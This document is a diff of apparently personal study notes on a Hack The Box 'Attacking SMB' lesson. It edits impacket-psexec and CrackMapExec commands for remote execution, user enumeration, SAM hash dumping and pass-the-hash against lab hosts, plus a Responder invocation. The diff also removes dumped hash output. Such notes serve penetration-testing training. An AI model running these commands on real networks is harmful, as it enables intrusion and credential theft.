@@ -15,6 +15,14 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 ---
 
+# Normal 
+
+```shell-session
+Retric@htb[/htb]$ impacket-psexec domain/administrator:'Password123!'@10.10.110.17
+```
+
+---
+
 ```shell-session
 Retric@htb[/htb]$ impacket-psexec -h
 
@@ -65,7 +73,7 @@ To connect to a remote machine with a local administrator account, using `impac
   Attacking SMB
 
 ```shell-session
-Retric@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
+Retric@htb[/htb]$ impacket-psexec 'DOMAIN/administrator:Password123!@10.10.110.17'
 ```
 
 ```
@@ -91,19 +99,14 @@ WIN7BOX
 
 The same options apply to `impacket-smbexec` and `impacket-atexec`.
 
-#### CrackMapExec
+---
+#### Attacking SMB : CrackMapExec
 
 Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.
 
-  Attacking SMB
-
 ```shell-session
-Retric@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
-
-SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
-SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
-SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
-SMB         10.10.110.17 445    WIN7BOX  nt authority\system
+crackmapexec smb 10.10.110.17 -u Administrator -p
+'Password123!' -x 'whoami' --exec-method smbexec
 ```
 
 **Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.
@@ -112,20 +115,8 @@ SMB         10.10.110.17 445    WIN7BOX  nt authority\system
 
 Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.
 
-  Attacking SMB
-
 ```shell-session
-Retric@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
-
-SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
-SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
-SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
-SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
-SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
-SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
-SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
+crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 ```
 
 #### Extract Hashes from SAM Database
@@ -136,21 +127,8 @@ The Security Account Manager (SAM) is a database file that stores users' passwor
 - Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
 - Pass The Hash. We will discuss it later in this section.
 
-  Attacking SMB
-
 ```shell-session
-Retric@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
-
-SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
-SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
-SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
-SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
-SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
-SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 ```
 
 #### Pass-the-Hash (PtH)
@@ -160,10 +138,7 @@ If we manage to get an NTLM hash of a user, and if we cannot crack it, we can st
   Attacking SMB
 
 ```shell-session
-Retric@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
-
-SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
-SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
+crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
 ```
 
 #### Forced Authentication Attacks
@@ -177,7 +152,7 @@ Let's illustrate an example to understand better how `Responder` works. Imagin
   Attacking SMB
 
 ```shell-session
-Retric@htb[/htb]$ responder -I <interface name>
+responder -I <interface name>
 ```
 
 When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:
